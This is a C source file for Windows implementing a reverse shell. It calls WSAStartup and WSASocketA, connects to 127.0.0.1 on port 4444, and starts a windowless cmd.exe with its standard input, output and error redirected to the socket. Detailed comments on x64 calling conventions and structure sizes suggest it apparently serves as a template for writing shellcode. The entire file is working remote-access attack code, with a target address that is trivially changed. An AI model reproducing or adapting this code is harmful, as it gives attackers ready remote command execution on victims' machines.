#include "windows.h"
#include "winsock2.h"

// Windows ABI follows a standard calling convention.
//
// RCX                          => 1st parameter
// RDX                          => 2nd parameter
// R8                           => 3rd parameter
// R9                           => 4th parameter
// [RSP + 0x20]                 => 5th parameter
// [RSP + 0x28]                 => 6th parameter
// ...
// [RSP + 0x00 .. 0x018] Belong to the functions
// being called. This stack space is used to save
// any arguments that as may need be.

void main() {
        // WSAStartup calls for 2 parameters.
        // 
        // RCX                  => Version requested.
        // RDX                  => Pointer to WSAData.
        //
        // WSAData is a 400 byte structure. It 
        // is not required to be zeroed out.

        WSADATA WsaData;

        if (WSAStartup(
                0x0202, 
                &WsaData
        ))
                return;

        // WSASocketA calls for 6 parameters.
        // 
        // RCX                  => Address family.
        // RDX                  => Type.
        // R8                   => Protocol.
        // R9                   => Pointer to protocol info.
        // [RSP + 0x20]         => Group.
        // [RSP + 0x28]         => Flags.
        // 
        // Protocol Info may be 0. Group may be 0.
        // 
        // WSASocketA returns a handle to a valid,
        // non-overlapping socket opened by the OS.
        // (socket() opens an overlapping socket).

        SOCKET s;

        if (!(s = (SOCKET) WSASocketA(
                AF_INET,
                SOCK_STREAM, 
                IPPROTO_TCP, 
                0, 
                0, 
                0
        )))
                return;

        // connect calls for 3 arguments.
        //
        // RCX                  => Socket handle.
        // RDX                  => Socket address.
        // R8                   => Size of socket address.
        //
        // Socket address is a 16 byte structure
        // consisting of address, port, and family.
        // This structure also has 8 bytes of padding.

        SOCKADDR_IN name        = {
                .sin_family             = AF_INET,
                .sin_port               = htons(0x115C),        // 0xXX 0x00 => 0x00 0x00
                .sin_addr.s_addr        = htonl(0x7F000001),    // 0xXX 0x00 0xYY 0xZZ => 0xZZ 0xYY 0x00 0xXX
        };

        if (connect(
                s, 
                &name, 
                sizeof(name)
        ))
                return;

        // CreateProcessA calls for 10 arguments.
        //
        // RCX                  => Pointer to application name.
        // RDX                  => Pointer to command line.
        // R8                   => Pointer to process attributes.
        // R9                   => Pointer to thread attributes.
        // [RSP + 0x20]         => Boolean to inherit handles.
        // [RSP + 0x28]         => Creation flags.
        // [RSP + 0x30]         => Environment.
        // [RSP + 0x38]         => Current directory.
        // [RSP + 0x40]         => Startup information.
        // [RSP + 0x48]         => process information.
        // 
        // Inherit handles must be true for a process receiving
        // different standard handles.
        // 
        // Startup information is a 104 byte structure that
        // includes fields for standard handles and 
        // startup routine.
        // 
        // Process information is a 16 byte structure for
        // process and thread information. Is not required to
        // be zeroed.

        CHAR CommandLine[]      = "cmd.exe";

        STARTUPINFO si          = {
                .cb             = sizeof(si),
                .dwFlags        = 0x00000100,
                .hStdInput      = s,
                .hStdOutput     = s,
                .hStdError      = s
        };

        PROCESS_INFORMATION pi  = { 0 };

        if (!CreateProcessA(
                NULL, 
                CommandLine, 
                NULL, 
                NULL, 
                TRUE, 
                CREATE_NO_WINDOW, 
                NULL, 
                NULL,
                &si, 
                &pi
        ))
                return;
}